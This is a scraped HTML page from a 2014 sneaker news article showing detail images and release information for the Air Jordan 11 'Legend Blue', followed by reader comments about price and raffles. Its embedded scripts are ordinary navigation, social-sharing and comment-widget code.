	<option class="level-0" value="4132">Top Categories&nbsp;&nbsp;(1)</option>
	<option class="level-0" value="14">Toys&nbsp;&nbsp;(39)</option>
	<option class="level-0" value="33">Trainer&nbsp;&nbsp;(1,547)</option>
	<option class="level-0" value="66">Upcoming Sneakers&nbsp;&nbsp;(23,149)</option>
	<option class="level-0" value="53">Vandal&nbsp;&nbsp;(104)</option>
	<option class="level-0" value="32">Vans&nbsp;&nbsp;(1,459)</option>
	<option class="level-0" value="37">Vintage&nbsp;&nbsp;(573)</option>
	<option class="level-0" value="82">Visvim&nbsp;&nbsp;(40)</option>
	<option class="level-0" value="279">Weekly Rewind&nbsp;&nbsp;(264)</option>
	<option class="level-0" value="26">WMNS&nbsp;&nbsp;(1,602)</option>
</select>
                                    <script type="text/javascript">
            var dropdown = document.getElementById("cat_menu");
            function onCatChange() {
                if (dropdown.options[dropdown.selectedIndex].value > 0) {
                    location.href = "/?cat=" + dropdown.options[dropdown.selectedIndex].value;
                }
            }
            dropdown.onchange = onCatChange;
                                    </script>
                                </li>
                                <li>
                                    <select id="brand_menu"><option value="brand">BRANDS</option><option value="/category/air-jordan/">Jordans</option>
<option value="/?s=nike">nike</option>
<option value="/category/adidas/">adidas</option>
<option value="/category/reebok/">reebok</option>
<option value="/category/asics/">asics</option>
<option value="/category/new-balance/">new balance</option>
<option value="/category/vans/">vans</option>
<option value="/category/saucony/">saucony</option>
<option value="/category/converse/">converse</option>
<option value="/category/puma/">puma</option>
<option value="/category/supra/">supra</option>
<option value="http://sneakernews.com/tag/under-armour/">under armour</option>
</select>                                    <script type="text/javascript">
                                        var dropdown_brand = document.getElementById("brand_menu");
                                        var site_url = 'http://sneakernews.com/';
                                        function onBrandChange() {
                                            if (dropdown_brand.options[dropdown_brand.selectedIndex].value != 'brand') {
                                                location.href = site_url + dropdown_brand.options[dropdown_brand.selectedIndex].value;
                                            }
                                        }
                                        dropdown_brand.onchange = onBrandChange;
                                    </script>
                                </li>
                                <li><a href="/tag/lebron-12/">LeBron 12</a></li>
                                <li><a href="/tag/air-jordan-xx9/">Air Jordan XX9</a></li>
                                <li><a href="/tag/nike-kd-7/">kd 7</a></li>
                                <li><a href="/tag/nike-roshe-run/">Roshe Run</a></li>
                                <li><a href="/category/air-jordan/">Jordans</a></li>
                                <li><a href="/tag/kobe-9/">Kobe 9</a></li>
                                <li><a href="/category/adidas/">Adidas</a></li>
                                <li><a href="/category/just-released/">Just Released</a></li>
                                <li><a href="/category/upcoming-sneakers/">Upcoming</a></li>
                            </ul>
                        </li>
                        <li><a href="/air-jordan-brand-jordan/">air jordan history</a></li>
                        <li><a href="/nike-sb-skateboarding/">nike sb archive</a></li>
                    </ul>	
                </div>
            </header> 
            <!--header-->
						<!-- open cmn_wrap -->
			<div id="cmn_wrap"><!--container-->
<div id="detail-page-container">
    <div class="wrapper">
        <div class="detail-con-main">
            <script type="text/javascript" async src="//assets.pinterest.com/js/pinit.js"></script>
                            <div class="detail-wide-main">

                    <div class="product-detail-main">
                        <h1>A Detailed Look at the Air Jordan 11 &#8220;Legend Blue&#8221;</h1>
                        <div class="date-and-name">
                            <p><span>November 28th, 2014 <em>by</em> <a href="http://sneakernews.com/2014/11/28/detailed-look-air-jordan-11-legend-blue/"><a href="http://sneakernews.com/author/johnkimx83/" title="Posts by John Kim" rel="author">John Kim</a>  </a> /</span> 
                                <b class="comment">
									154								</b>
																</p>
                        </div>
                        <div class="social-vote-box">	

                            <div class="vote-box"><div id="post-ratings-552629" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="a1fda9c5a7"><span class="default-rating-digit"><span class="show-rating-digit default-rating-digit">4.61 </span> /  5 <i>(82 VOTES)</i></span><div class="vote-icon"><span class="rating-img"> <i><b><span class="post-ratings-text" id="ratings_552629_text"></span></b></i>  <img id="rating_552629_1" src="http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/images/stars/rating_on_left.png" alt="RATE THIS SHOE" title="RATE THIS SHOE" onmouseover="current_rating(552629, 1, 'RATE THIS SHOE');" onmouseout="ratings_off(9.22, 9, 0);" onclick="rate_post();" onkeypress="rate_post();" style="cursor: pointer; border: 0px;" /><img id="rating_552629_2" src="http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/images/stars/rating_on.png" alt="RATE THIS SHOE" title="RATE THIS SHOE" onmouseover="current_rating(552629, 2, 'RATE THIS SHOE');" onmouseout="ratings_off(9.22, 9, 0);" onclick="rate_post();" onkeypress="rate_post();" style="cursor: pointer; border: 0px;" /><img id="rating_552629_3" src="http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/images/stars/rating_on_left.png" alt="RATE THIS SHOE" title="RATE THIS SHOE" onmouseover="current_rating(552629, 3, 'RATE THIS SHOE');" onmouseout="ratings_off(9.22, 9, 0);" onclick="rate_post();" onkeypress="rate_post();" style="cursor: pointer; border: 0px;" /><img id="rating_552629_4" src="http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/images/stars/rating_on.png" alt="RATE THIS SHOE" title="RATE THIS SHOE" onmouseover="current_rating(552629, 4, 'RATE THIS SHOE');" onmouseout="ratings_off(9.22, 9, 0);" onclick="rate_post();" onkeypress="rate_post();" style="cursor: pointer; border: 0px;" /><img id="rating_552629_5" src="http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/images/stars/rating_on_left.png" alt="RATE THIS SHOE" title="RATE THIS SHOE" onmouseover="current_rating(552629, 5, 'RATE THIS SHOE');" onmouseout="ratings_off(9.22, 9, 0);" onclick="rate_post();" onkeypress="rate_post();" style="cursor: pointer; border: 0px;" /><img id="rating_552629_6" src="http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/images/stars/rating_on.png" alt="RATE THIS SHOE" title="RATE THIS SHOE" onmouseover="current_rating(552629, 6, 'RATE THIS SHOE');" onmouseout="ratings_off(9.22, 9, 0);" onclick="rate_post();" onkeypress="rate_post();" style="cursor: pointer; border: 0px;" /><img id="rating_552629_7" src="http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/images/stars/rating_on_left.png" alt="RATE THIS SHOE" title="RATE THIS SHOE" onmouseover="current_rating(552629, 7, 'RATE THIS SHOE');" onmouseout="ratings_off(9.22, 9, 0);" onclick="rate_post();" onkeypress="rate_post();" style="cursor: pointer; border: 0px;" /><img id="rating_552629_8" src="http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/images/stars/rating_on.png" alt="RATE THIS SHOE" title="RATE THIS SHOE" onmouseover="current_rating(552629, 8, 'RATE THIS SHOE');" onmouseout="ratings_off(9.22, 9, 0);" onclick="rate_post();" onkeypress="rate_post();" style="cursor: pointer; border: 0px;" /><img id="rating_552629_9" src="http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/images/stars/rating_on_left.png" alt="RATE THIS SHOE" title="RATE THIS SHOE" onmouseover="current_rating(552629, 9, 'RATE THIS SHOE');" onmouseout="ratings_off(9.22, 9, 0);" onclick="rate_post();" onkeypress="rate_post();" style="cursor: pointer; border: 0px;" /><img id="rating_552629_10" src="http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/images/stars/rating_off_right.png" alt="RATE THIS SHOE" title="RATE THIS SHOE" onmouseover="current_rating(552629, 10, 'RATE THIS SHOE');" onmouseout="ratings_off(9.22, 9, 0);" onclick="rate_post();" onkeypress="rate_post();" style="cursor: pointer; border: 0px;" /></span> </div><meta itemprop="name" content="A Detailed Look at the Air Jordan 11 &#8220;Legend Blue&#8221;" /><meta itemprop="description" content="

The Air Jordan 11 &quot;Legend Blue&quot; is making a ton of noise today and certainly taking some of the spotlight off the Infrared 6s on this Black Friday. We recently confirmed through Jordan Brand that ..." /><meta itemprop="url" content="http://sneakernews.com/2014/11/28/detailed-look-air-jordan-11-legend-blue/" /><div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating"><meta itemprop="bestRating" content="10" /><meta itemprop="ratingValue" content="9.22" /><meta itemprop="ratingCount" content="82" /></div></div><div id="post-ratings-552629-loading" class="post-ratings-loading">
			<img src="http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/images/loading.gif" width="16" height="16" alt="Loading..." title="Loading..." class="post-ratings-image" />Loading...</div></div>	                            
                            <div class="social-shares">
                                <div class="soc-icon">
                                    <div class="facebook social_box">
                                        <div class="like_box">
                                            <div class="fb-like" data-href="http://sneakernews.com/2014/11/28/detailed-look-air-jordan-11-legend-blue/" data-layout="button_count" data-action="like" data-show-faces="false" data-share="false"></div>
                                        </div>
                                    </div>
                                    <!--twitter-->
                                    <div class="twitter social_box">
                                        <div class="like_box">
                                            <a href="https://twitter.com/share" class="twitter-share-button external" data-count="horizontal" data-url="http://sneakernews.com/2014/11/28/detailed-look-air-jordan-11-legend-blue/" data-text="A Detailed Look at the Air Jordan 11 &#8220;Legend Blue&#8221;" data-via="sneakernews" target="_blank">Tweet</a>												
                                        </div>
                                    </div>
                                    <!--twitter-->
                                    <div class="google social_box">
                                        <div class="like_box">
                                            <div class="g-plusone" data-callback="googlePlusCallback" data-size="medium" data-href="http://sneakernews.com/2014/11/28/detailed-look-air-jordan-11-legend-blue/"></div>
                                        </div>	
                                    </div>
                                    <div class="pinterest social_box">
                                        <div class="like_box">
                                            <a href="//www.pinterest.com/pin/create/button/?url=http://sneakernews.com/2014/11/28/detailed-look-air-jordan-11-legend-blue/" data-pin-do="buttonPin" data-pin-zero="true" data-pin-config="beside" class="external" target="_blank"><img src="//assets.pinterest.com/images/pidgets/pinit_fg_en_rect_gray_20.png" /></a>
                                        </div>	
                                    </div>
                                </div>

                                <div class="shares-like">
                                    <strong>2770</strong> <span>shares / likes</span>
                                </div>
                            </div>
                        </div>
                        <div class="product-data full-with-post-hd" >
							<p><img alt="" src="http://cdn.sneakernews.com/wp-content/uploads/2014/11/jordan-11-legend-blue-price-is-200-2.jpg" width="940" height="630" /></p>
<p>The Air Jordan 11 &#8220;Legend Blue&#8221; is making a ton of noise today and certainly taking some of the spotlight off the Infrared 6s on this Black Friday. We recently confirmed through Jordan Brand that the <a href="http://sneakernews.com/tag/air-jordan-11-legend-blue/">Legend Blue 11s</a> will indeed retail for $200, and while the heightened price of these year-end Jordan 11s stirred up quite a conversation, there&#8217;s no doubt that these will fly off the shelves. A little history reminder for y&#8217;all; these &#8220;Legend Blue&#8221; <a href="http://sneakernews.com/category/air-jordan/">Jordans</a> were the pair that MJ wore during his first NBA All-Star Game back from his first retirement. Get a detailed look at these <a href="http://sneakernews.com/air-jordan-release-dates/">upcoming Jordan releases</a> below and give us your thoughts on whether or not the Legend Blue 11s is the Retro release of 2014.</p>
<p><span id="more-552629"></span></p>
<p>Source: <a href="http://kenlu.net/2014/11/air-jordan-11-legend-blue-detail-images/" class="external" target="_blank">kenlu</a></p>
<p><strong><a href="http://sneakernews.com/tag/air-jordan-11-legend-blue/">AIR JORDAN 11 RETRO “LEGEND BLUE”<br />
</a>Color:</strong> White/Black-Legend Blue<br />
<strong>Style Code:</strong> 378037-117<br />
<strong>Release Date:</strong> 12/20/14<br />
<strong>Price:</strong> $200</p>
<p><img class="alignnone size-full wp-image-552644" alt="" src="http://cdn.sneakernews.com/wp-content/uploads/2014/11/jordan-11-legend-blue-price-is-200-1.jpg" width="940" height="630" /></p>
<p><img class="alignnone size-full wp-image-552642" alt="" src="http://cdn.sneakernews.com/wp-content/uploads/2014/11/jordan-11-legend-blue-price-is-200-3.jpg" width="940" height="630" /></p>
<p class="tag-product"><i>Filed under:</i> <a href="http://sneakernews.com/category/air-jordan/" rel="category tag">Air Jordan</a> </p> <p class="tag-product"><i>Tags:</i> <a href="http://sneakernews.com/tag/air-jordan-11/" rel="tag">Air Jordan 11</a> <a href="http://sneakernews.com/tag/air-jordan-11-legend-blue/" rel="tag">Air Jordan 11 Legend Blue</a> <a href="http://sneakernews.com/tag/air-jordan-11-legend-blue-price-release-date/" rel="tag">Air Jordan 11 Legend Blue - Price &amp; Release Date</a> <a href="http://sneakernews.com/tag/air-jordan-xi/" rel="tag">Air Jordan XI</a> </p>                        </div>
                    </div>
                 <div class="detail-page-pagination"><div class="pagination-wide-page"><div class="pagination-main-con"><div class='wp-pagenavi'>
<span class="previouspostslink">Previous Page</span><span class='current'>1</span><a class="page larger" href="http://sneakernews.com/2014/11/28/detailed-look-air-jordan-11-legend-blue/2/">2</a><a class="page larger" href="http://sneakernews.com/2014/11/28/detailed-look-air-jordan-11-legend-blue/3/">3</a><a class="page larger" href="http://sneakernews.com/2014/11/28/detailed-look-air-jordan-11-legend-blue/4/">4</a><a class="nextpostslink" rel="next" href="http://sneakernews.com/2014/11/28/detailed-look-air-jordan-11-legend-blue/2/">Next Page</a>
</div></div></div></div>                         <!--<div class="page-link"> </div>-->
                </div><!-- detail-wide-main -->
                								
                					
				
                <!--<div style="width:56%;float:left;display:inline;margin-right:60px;"></div>-->
                    <div class="left-main wide-post-comment"><div id="livefyre-comments"><script>
  (function() {
    
   var a=this;var b,c,d,e,f;function g(){return a.navigator?a.navigator.userAgent:null}f=e=d=c=b=!1;var h;if(h=g()){var i=a.navigator;b=0==h.indexOf("Opera");c=!b&&-1!=h.indexOf("MSIE");e=(d=!b&&-1!=h.indexOf("WebKit"))&&-1!=h.indexOf("Mobile");f=!b&&!d&&"Gecko"==i.product}var j=c,k=f,l=d,m=e;var n;if(b&&a.opera){var o=a.opera.version;"function"==typeof o&&o()}else k?n=/rv\:([^\);]+)(\)|;)/:j?n=/MSIE\s+([^\);]+)(\)|;)/:l&&(n=/WebKit\/(\S+)/),n&&n.exec(g());var p=document,q=p.createElement("link");q.rel="stylesheet";q.type="text/css";q.href="http://zor.fyre.co/wjs/v3.0/css/livefyre_"+(m?"mobile":"embed")+".css";q.media="all";p.getElementsByTagName("head")[0].appendChild(q);var r="header hgroup footer article section aside nav figure figcaption embed audio video canvas details summary time mark".split(" "),s=p.createDocumentFragment(),t;for(t=0; t<r.length; t++){s.appendChild(p.createElement(r[t]))};
   })();    
</script>
<div class="fyre fyre-width-large fyre-bootstrap">
  <div class="fyre-widget">
    <div class="fyre-stream-stats">
      <div class="fyre-comment-count">
        <span>152 comments</span>
      </div>

      <div class="fyre-divider"></div>

      <div class="fyre-help">
        <div class="fyre-box-wrapper">
          <a href="http://livefyre.com" target="_blank" class="external"><span class="fyre-logo-drop">&nbsp</span>
          <img class="fyre-logo-help" src="http://zor.fyre.co/wjs/v3.0/images/lf-logo.png" alt="Livefyre" /></a>
          
          <ul class="fyre-box-list">
            <li><a href="http://livefyre.com" target="_blank" title="Get Livefyre" class="external">Get
            Livefyre</a></li>

            <li><a href="http://support.livefyre.com" target="_blank" title="FAQ" class="external">FAQ</a></li>
          </ul>
        </div>
      </div>
    </div>

    <div class="fyre-auth">
      <div class="fyre-login-bar"><a rel="nofollow" href="#" class="fyre-user-loggedout">Sign in</a></div>
    </div>

    <div class="fyre-editor">
      <div class="fyre-editor-container">
        <div class="fyre-editor-editable" style="height: 100px;"></div>

        <div class="fyre-editor-toolbar">
          <div class="goog-toolbar goog-toolbar-horizontal" style=
          "-webkit-user-select: none;" role="toolbar" aria-activedescendant="">
            <div class="goog-inline-block fyre-button-left fyre-format-button" title=""
            role="button" style="-webkit-user-select: none;" id=":0">
              <div class="goog-inline-block fyre-button-left-outer-box" style=
              "-webkit-user-select: none;">
                <div class="goog-inline-block fyre-button-left-inner-box" style=
                "-webkit-user-select: none;"></div>
              </div>
            </div>

            <div class="goog-inline-block fyre-button-left fyre-mention-button" title=""
            role="button" style="-webkit-user-select: none;" id=":1">
              <div class="goog-inline-block fyre-button-left-outer-box" style=
              "-webkit-user-select: none;">
                <div class="goog-inline-block fyre-button-left-inner-box" style=
                "-webkit-user-select: none;"></div>
              </div>
            </div>

            <div class="goog-inline-block fyre-button-left fyre-follow-button" title=""
            role="button" style="-webkit-user-select: none;" id=":2">
              <div class="goog-inline-block fyre-button-left-outer-box" style=
              "-webkit-user-select: none;">
                <div class="goog-inline-block fyre-button-left-inner-box" style=
                "-webkit-user-select: none;">
                  + Follow
                </div>
              </div>
            </div>

            <div class=
            "goog-inline-block fyre-button-right fyre-post-button fyre-post-button-enabled"
            title="" role="button" style="-webkit-user-select: none;" id=":3">
              <div class="goog-inline-block fyre-button-right-outer-box" style=
              "-webkit-user-select: none;">
                <div class="goog-inline-block fyre-button-right-inner-box" style=
                "-webkit-user-select: none;">
                  Post comment
                </div>
              </div>
            </div>

            <div class=
            "goog-inline-block fyre-button-right fyre-post-to fyre-post-to-facebook"
            title="" role="button" style="-webkit-user-select: none;" id=":4">
              <div class="goog-inline-block fyre-button-right-outer-box" style=
              "-webkit-user-select: none;">
                <div class="goog-inline-block fyre-button-right-inner-box" style=
                "-webkit-user-select: none;"></div>
              </div>
            </div>

            <div class=
            "goog-inline-block fyre-button-right fyre-post-to fyre-post-to-twitter"
            title="" role="button" style="-webkit-user-select: none;" id=":5">
              <div class="goog-inline-block fyre-button-right-outer-box" style=
              "-webkit-user-select: none;">
                <div class="goog-inline-block fyre-button-right-inner-box" style=
                "-webkit-user-select: none;"></div>
              </div>
            </div>

            <div class=
            "goog-inline-block fyre-button-right fyre-post-to fyre-post-to-linkedin"
            title="" role="button" style="-webkit-user-select: none;" id=":7">
              <div class="goog-inline-block fyre-button-right-outer-box" style=
              "-webkit-user-select: none;">
                <div class="goog-inline-block fyre-button-right-inner-box" style=
                "-webkit-user-select: none;"></div>
              </div>
            </div>

            <div class="goog-toolbar-separator goog-inline-block" style=
            "-webkit-user-select: none;" role="separator" id=":6">
              &nbsp;
            </div>
          </div>

          <div class="fyre-format-toolbar" style="display: none;">
            <div class="goog-toolbar goog-toolbar-horizontal" style=
            "-webkit-user-select: none;" role="toolbar" tabindex="-1">
              <div class="goog-inline-block goog-toolbar-button" title="Bold"
              aria-pressed="true" role="button" style="-webkit-user-select: none;" id=
              "+bold">
                <div class="goog-inline-block goog-toolbar-button-outer-box" style=
                "-webkit-user-select: none;">
                  <div class="goog-inline-block goog-toolbar-button-inner-box" style=
                  "-webkit-user-select: none;">
                    <div class="tr-icon tr-bold" style="-webkit-user-select: none;">
                    </div>
                  </div>
                </div>
              </div>

              <div class="goog-inline-block goog-toolbar-button" title="Italic"
              aria-pressed="true" role="button" style="-webkit-user-select: none;" id=
              "+italic">
                <div class="goog-inline-block goog-toolbar-button-outer-box" style=
                "-webkit-user-select: none;">
                  <div class="goog-inline-block goog-toolbar-button-inner-box" style=
                  "-webkit-user-select: none;">
                    <div class="tr-icon tr-italic" style="-webkit-user-select: none;">
                    </div>
                  </div>
                </div>
              </div>

              <div class="goog-inline-block goog-toolbar-button" title="Underline"
              aria-pressed="true" role="button" style="-webkit-user-select: none;" id=
              "+underline">
                <div class="goog-inline-block goog-toolbar-button-outer-box" style=
                "-webkit-user-select: none;">
                  <div class="goog-inline-block goog-toolbar-button-inner-box" style=
                  "-webkit-user-select: none;">
                    <div class="tr-icon tr-underline" style="-webkit-user-select: none;">
                    </div>
                  </div>
                </div>
              </div>

              <div class="goog-inline-block goog-toolbar-button" title=
              "Add or remove link" aria-pressed="true" role="button" style=
              "-webkit-user-select: none;" id="+link">
                <div class="goog-inline-block goog-toolbar-button-outer-box" style=
                "-webkit-user-select: none;">
                  <div class="goog-inline-block goog-toolbar-button-inner-box" style=
                  "-webkit-user-select: none;">
                    <div class="tr-link" style="-webkit-user-select: none;">
                      Link
                    </div>
                  </div>
                </div>
              </div>

              <div class="goog-inline-block goog-toolbar-button" title="Numbered list"
              aria-pressed="true" role="button" style="-webkit-user-select: none;" id=
              "+insertOrderedList">
                <div class="goog-inline-block goog-toolbar-button-outer-box" style=
                "-webkit-user-select: none;">
                  <div class="goog-inline-block goog-toolbar-button-inner-box" style=
                  "-webkit-user-select: none;">
                    <div class="tr-icon tr-insertOrderedList" style=
                    "-webkit-user-select: none;"></div>
                  </div>
                </div>
              </div>

              <div class="goog-inline-block goog-toolbar-button" title="Bullet list"
              aria-pressed="true" role="button" style="-webkit-user-select: none;" id=
              "+insertUnorderedList">
                <div class="goog-inline-block goog-toolbar-button-outer-box" style=
                "-webkit-user-select: none;">
                  <div class="goog-inline-block goog-toolbar-button-inner-box" style=
                  "-webkit-user-select: none;">
                    <div class="tr-icon tr-insertUnorderedList" style=
                    "-webkit-user-select: none;"></div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div class="fyre-comment-stream" style="">
      <div class="fyre-stream-sort">
        <a class="fyre-stream-sort-newest">Newest</a> | <a class="fyre-stream-sort-oldest">Oldest</a>
      </div>

      <div class="fyre-stream-content">      
        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/25/45a046fc1b60e572402fce71fc35af15/50.jpg?v=1393018775" class=
    "fyre-user-avatar" alt="SHUU_MO" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">SHUU_MO</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p>“<a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:16180874@twitter.com" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/SneakerNews" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">SneakerNews</span></a>: On the Eve of the biggest General release of the year. Legend Blue 11s!  <a href="http://t.co/7dihPuvaxQ" target="_blank" rel="nofollow" class="external">dlvr.it/7t0QXz</a> <a href="http://t.co/tDpRh9UKLj" target="_blank" rel="nofollow" class="external">pic.twitter.com/tDpRh9UKLj</a>”</p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            

        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/25/af6714f63ef08956fb1e6a262b026b37/50.jpg?v=1419049879" class=
    "fyre-user-avatar" alt="Jordanmack5" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Jordanmack5</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:16180874@twitter.com" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/SneakerNews" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">SneakerNews</span></a> <a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:2431205791@twitter.com" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/taytaytweet" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">taytaytweet</span></a></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/a21f33e3fc3617ce44d6a98386e570b1/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="HighD3F" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">HighD3F</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>How much is Tax</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/69b833feb62ddc03b17b20c08224e138/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="Sweetcakes28" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Sweetcakes28</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>are they the same price online on or after 12/2014</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/1/33c052694e650ce61880aa561315bfb9/50.jpg?v=1419179774" class=
    "fyre-user-avatar" alt="slizick21" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">slizick21</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>If you missed the call, it's on to the next person! My girl just got the call so my week is set!</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            

        
            

        
            

        
            

        
            

        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/1c8933c8eb3711d38ad20c0b472dc0b3/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="jackperry44" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">jackperry44</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>does anyone know what happens if you miss the call if your ticket gets picked?</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/1e3944a6b2c21f0636cac3e732f1bcf0/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="irena_pinky" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">irena_pinky</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>ticket or the shoes in 6 please ?</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/f8181ff6dff65dd80f959abd99fca278/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="tim234" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">tim234</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
